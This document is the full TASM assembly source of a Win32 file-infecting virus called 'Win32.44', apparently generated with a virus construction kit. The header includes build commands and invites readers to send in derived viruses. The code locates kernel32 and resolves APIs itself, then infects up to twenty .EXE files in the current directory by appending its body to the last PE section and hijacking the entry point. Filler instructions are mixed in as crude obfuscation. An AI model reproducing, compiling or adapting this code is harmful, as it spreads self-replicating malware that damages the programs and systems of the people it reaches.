              
;
;
; Win32.44 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.44
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : 44
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 32
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 12d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebx
 sub ebx, offset Delta
                                        ; mov ebp, ebx
                                        ; clear ebp
 sub ebp, ebp
 add ebp, ebx
 jmp KernelSearchStart


;        [ ///// * Retrieve non Kernel API's * \\\\\ ]

GetOtherApis:
 push ecx 
 push edx 
 push ebx
 call dword ptr [ebp+XLoadLibraryA]
 pop edx 
 pop ecx 
                                        ; mov ebx, eax
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, eax
GetOtherApiLoop:
 push ecx 
 push edx 
 push ecx
 push ebx
 call dword ptr [ebp+XGetProcAddress]
 pop edx 
 pop ecx 
 mov dword ptr [edi], eax
                                        ; add edi, 4
 dec edi
 add edi, 5d
 add edx, -1
 add edx, -1
 add edx, 1
 jz GetOtherApiEnd
GetOtherApiLoop2:
                                        ; add ecx, 1
 sub ecx, -1d
 cmp byte ptr [ecx], 0
 jne GetOtherApiLoop2
                                        ; add ecx, 1
 inc ecx
 jmp GetOtherApiLoop
GetOtherApiEnd:
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov edx, 80000000h or 40000000h
 push edx
 mov eax, ebp
 add eax, offset WFD_szFileName

 push eax
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx
 push 0
 push edx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 xor dword ptr [ebp+MapHandle], eax
 pop edx
 test eax, eax
 jz CloseFile
 push edx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 shr ecx, 1d                            ; Trash
 dec eax
 inc eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 lea ecx, [ebp+WFD_szFileName]

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 mov ecx, ebp
 add ecx, offset WFD_szFileName


 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 cmp eax, 0
 je NoInfection
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov eax, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
                                        ; mov ecx, 2645
 mov ecx, ( 2645d xor 7d )
 xor ecx, 7d
 or ecx, ecx
 jnz Notagoodfile
Goodfile:
                                        ; clear ecx
 and ecx, 0
 mov cx, word ptr [eax+3Ch]
 or ecx, ecx
 jz Notagoodfile
 push dword ptr [eax+3Ch]
 pop edi
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edi
 jb Notagoodfile
 add edi, eax
                                        ; check for PE Header
                                        ; check for EP
 movzx ecx, word ptr [edi]
 xor ecx, 'EP'
 jz Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edi+4Ch], '44'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov cx, word ptr [edi+16h]
 and cx, 00002h
 cmp cx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov edx, dword ptr [ebp+Attributes]
 push edx
 lea ebx, [ebp+WFD_szFileName]
 xchg edx, ebx

 push edx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;        [ ///// * Search Kernel Procedure * \\\\\ ]

 inc ebx                                ; Trash
KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ecx
 dec esp
 sub esp, 3d
                                        ; round to pages
 shr ecx, 16d
 ror ecx, 16d
                                        ; add ecx, 1
 sub ecx, -1d
GetKernelLoop:
                                        ; clear eax
 sub eax, eax
 sub ecx, 1
 mov ax, word ptr [ecx+03ch]
 cmp ax,0f800h
 je GetKernelLoop
 cmp ecx, dword ptr [ecx+eax+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], ecx
 mov eax, ecx
 dec edx                                ; Trash
 add eax, [ecx+3Ch]
 mov [KernelPE+ebp], eax

 jmp GetApis

;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 sub edx, edx
 mov ecx, dword ptr [ebp+AlignReg2]
 push eax
 div ecx
 sub ecx, edx
 pop eax
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear ecx
 push 0
 pop ecx
 xor ecx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov edi, ecx
 add edi, [ecx+3Ch]
                                        ; get File Alignment
 mov eax, [edi+3Ch]
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], eax
 call Align
                                        ; clear ecx
 mov ecx, 53033d
 sub ecx, 53033d
 add ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 push ecx
 pop dword ptr [ebp+WFD_nFileSizeLow]
 call CreateMap
 jc NoEXE
                                        ; clear esi
 mov esi, 58406d
 sub esi, 58406d
 xor esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edx, dword ptr [esi+3Ch]
 add edx, esi
                                        ; infect by increasing the last section
                                        ; clear esi
 mov esi, 65399d
 sub esi, 65399d
 add esi, edx
                                        ; get last section
                                        ; clear ebx
 mov ebx, 0
 mov bx, word ptr [esi+06h]
 dec ebx
 imul ebx, ebx, 28h
 add edx, ebx
                                        ; add edx, 120
 add edx, 120d
                                        ; clear eax
 mov eax, -39637d
 add eax, 39637d
 add eax, dword ptr [esi+74h]
 sal eax, 3
 add edx, eax
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], eax
 mov ecx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], ecx
 mov ecx, [edx+10h]
                                        ; mov ebx, ecx
 mov ebx, ecx
 add edx, 14h
 add ecx, [edx]
 sub edx, 14h
 push ecx
 push ebx
 pop eax
 add edx, 0Ch
 add eax, [edx]
 sub edx, 0Ch
 push eax
 pop dword ptr [ebp+NewEIP]
                                        ; save new enty point in file
 mov dword ptr [esi+28h], eax
                                        ; clear eax
 mov eax, 0

 add eax, [edx+10h]
 push eax
                                        ; calculate new section size
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], eax
 push dword ptr [esi+3Ch]
 xor dword ptr [ebp+Trash1], 1165844    ; Trash
 pop dword ptr [ebp+AlignReg2]
 call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [edx+10h], eax
 pop eax
 add eax, VirusSize
 mov dword ptr [edx+08h], eax
 mov eax, dword ptr [edx+10h]
 add eax, dword ptr [edx+0Ch]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], eax
                                        ; set write, read and code flag
 or dword ptr [edx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], '44'
                                        ; Append Virus
 pop edi
 mov esi, ebp
 add esi, offset Virus

 mov edx, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
 inc ebx                                ; Trash
 cmp dword ptr [ebp+XCheckSumMappedFile], -1d
 je NoCheckSum
 lea ecx, [ebp+CheckSum]

 push ecx
 mov eax, ebp
 add eax, offset HeaderSum

 push eax
                                        ; clear eax
 mov eax, 14023d
 sub eax, 14023d
 add eax, dword ptr [ebp+NewSize]
 push eax
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XCheckSumMappedFile]
                                        ; clear eax
 mov eax, -5161d
 add eax, 5161d
 add eax, dword ptr [ebp+MapAddress]
 mov eax, [eax+3Ch]
 add eax, dword ptr [ebp+MapAddress]
 mov ebx, dword ptr [ebp+CheckSum]
 mov dword ptr [eax+58h], ebx
NoCheckSum:
                                        ; decrease Infection Counter
                                        ; clear ebx
 xor ebx, ebx
 xor ebx, dword ptr [ebp+InfCounter]
 add ebx, -1
 mov dword ptr [ebp+InfCounter], 0
 xor dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 stc
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 CheckSum dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 MapHandle   dd 0h
 db 'Win32.44 by SnakeByte',0
 OldEIP      dd 0h
 KernelPE    dd 0h
 TempApisearch3 dd 0h
 InfCounter  dd 0h
 CheckSumMFA db 'CheckSumMappedFile',0
 OTableVA    dd 0h
 AlignReg1   dd 0h
 Attributes  dd 0h
 counter     dw 0h
 ATableVA    dd 0h
 TempAPI     dd 0h

 APINames:
 db 'MapViewOfFile', 0
 db 'LoadLibraryA', 0
 db 'CloseHandle', 0
 db 'FindFirstFileA', 0
 db 'SetFileAttributesA', 0
 db 'CreateFileA', 0
 db 'GetFileAttributesA', 0
 db 'UnmapViewOfFile', 0
 db 'FindNextFileA', 0
 db 'FindClose', 0
 db 'CreateFileMappingA', 0
 db 'GetProcAddress', 0

 MapAddress  dd 0h
 AlignReg2   dd 0h
 NewSize     dd 0h

 APIOffsets:
 XMapViewOfFile         dd 0h
 XLoadLibraryA          dd 0h
 XCloseHandle           dd 0h
 XFindFirstFileA        dd 0h
 XSetFileAttributesA    dd 0h
 XCreateFileA           dd 0h
 XGetFileAttributesA    dd 0h
 XUnmapViewOfFile       dd 0h
 XFindNextFileA         dd 0h
 XFindClose             dd 0h
 XCreateFileMappingA    dd 0h
 XGetProcAddress        dd 0h

 FileHandle  dd 0h
 XCheckSumMappedFile    dd 0h
 TempApisearch1 dd 0h
 NewEIP      dd 0h
 TempApisearch2 dd 0h
 Imagehlp    db 'imagehlp.dll',0
 filemask    db '*.EXE',0
 OldBase     dd 400000h
 Trash1      dd 0h
 FindHandle  dd 0h
 NTableVA    dd 0h
 KernelMZ    dd 0h
 HeaderSum dd 0h




;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
 mov esi, ebp
 add esi, offset WFD_szFileName

                                        ; mov ecx, 276
 mov ecx, ( 276d - 39d )
 add ecx, 39d

ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 inc esi
 dec ecx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov eax, ebp
 add eax, offset WIN32_FIND_DATA

 push eax
 mov ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov edx, ebp
 add edx, offset WIN32_FIND_DATA

 push edx
 push esi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], -1
 and dword ptr [ebp+FindHandle], eax
ret





;          [ ///// * Execute Original File * \\\\\ ]

 shl ecx, 19d                           ; Trash
NoKernel:
                                        ; store old EIP and ImageBase
                                        ; mov edi, -1
 mov edi, -1d
 and edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], edi

 mov ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 add dword ptr [ebp+retBase], ecx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 sub ebp, 1
 add ebp, 1
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retBase dd 0h
 add ebx,12345678h
 org $-4
 retEIP dd 0h
 push ebx
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldEIP]
 pop ecx

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], ecx

 push dword ptr [ebp+OldBase]
 pop esi

 mov dword ptr [ebp+retBase], esi




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov [ebp+InfCounter], 20d
 lea edi, [ebp+filemask]
 xchg edi, esi

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear edx
 push 0
 pop edx
 add edx, NumberOfApis

                                        ; load API Names and Offsets
 mov edi, offset APINames
 add edi, ebp

 mov eax, offset APIOffsets
 add eax, ebp


GetApisLoop: 

 mov ecx, edi
APINameDetect:                          ; calculate the lenght of the names
 inc ecx
 cmp byte ptr [ecx], 0
 jne APINameDetect
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

 push ecx
 sub dword ptr [esp], edi
 pop ecx
                                        ; search 'em
                                        ; ecx contains Name-Lenght
                                        ; edi points to the Name
                                        ; eax points to the offset

 call SearchAPI1
 add edi, ecx
                                        ; add edi, 1
 sub edi, -1d
 mov ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [eax], ebx
                                        ; add eax, 4
 add eax, 4d
 sub edx, 1
 jnz GetApisLoop
                                        ; mov edx, 1
 push 1d
 pop edx
 mov ebx, ebp
 add ebx, offset Imagehlp

 lea edi, [ebp+XCheckSumMappedFile]

 lea eax, [ebp+CheckSumMFA]
 xchg ecx, eax

 call GetOtherApis
 lea ebx, [ebp+Outbreak]
 xchg ebx, ecx

 push ecx
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Lenght of API-Name
                                        ; edi Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



 mov edx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear eax
 sub eax, eax
 add eax, [edx+78h]
 add eax, [ebp+KernelMZ]
                                        ; add eax, 28
 add eax, 28d
                                        ; get ATableVA
 mov edx, dword ptr [eax]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edx
                                        ; add eax, 4
 add eax, 4d
                                        ; get NTableVA
 mov edx, dword ptr [eax]
 add edx, [ebp+KernelMZ]
                                        ; add eax, 4
 dec eax
 add eax, 5d
 mov dword ptr [ebp+NTableVA], edx
 rol ebx, 15d                           ; Trash
                                        ; get OTableVA
 mov edx, dword ptr [eax]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edx
                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ebx
                                        ; clear eax
 mov eax, -55049d
 add eax, 55049d
 add eax, dword ptr [ebp+KernelMZ]
 add eax, dword ptr [ebx]
                                        ; mov ebx, eax
 mov ebx, eax
                                        ; mov edx, ebx
 mov edx, ebx
 mov dword ptr [ebp+TempApisearch1], ecx
 mov dword ptr [ebp+TempApisearch2], 0
 xor dword ptr [ebp+TempApisearch2], edx
 mov dword ptr [ebp+TempApisearch3], 0
 add dword ptr [ebp+TempApisearch3], edi
 cld
 and eax, 83355658d                     ; Trash

                                        ; edx Points to API-Name ( Kernel )
                                        ; edi Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov al, byte ptr [edi]
 cmp al, byte ptr [edx]
 jne ApiNotFound
 sub ecx, 1
                                        ; add ecx, 1
 sub ecx, -1d
 sub ecx, 1
 jz FoundApi1
                                        ; add edi, 1
 inc edi
                                        ; add edx, 1
 add edx, 1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop ebx
                                        ; clear ecx
 sub ecx, ecx
 xor ecx, dword ptr [ebp+TempApisearch1]
                                        ; clear edi
 push 0
 pop edi
 xor edi, dword ptr [ebp+TempApisearch3]
                                        ; clear edx
 xor edx, edx
 xor edx, dword ptr [ebp+TempApisearch2]
 sar eax, 4d                            ; Trash
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4h
                                        ; retrieve the offset
                                        ; clear eax
 mov eax, 60994d
 sub eax, 60994d
 and edx, 76450960d                     ; Trash
 mov ax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 mov edx, eax
                                        ; clear eax
 push 0
 pop eax
 mov ax, word ptr [edx]
 sal eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [eax]
 add ebx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ecx
 popad
 jmp ExecuteHost



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 sal ecx, 23d                           ; Trash
 push 0h
 call ExitProcess



end FakeCode

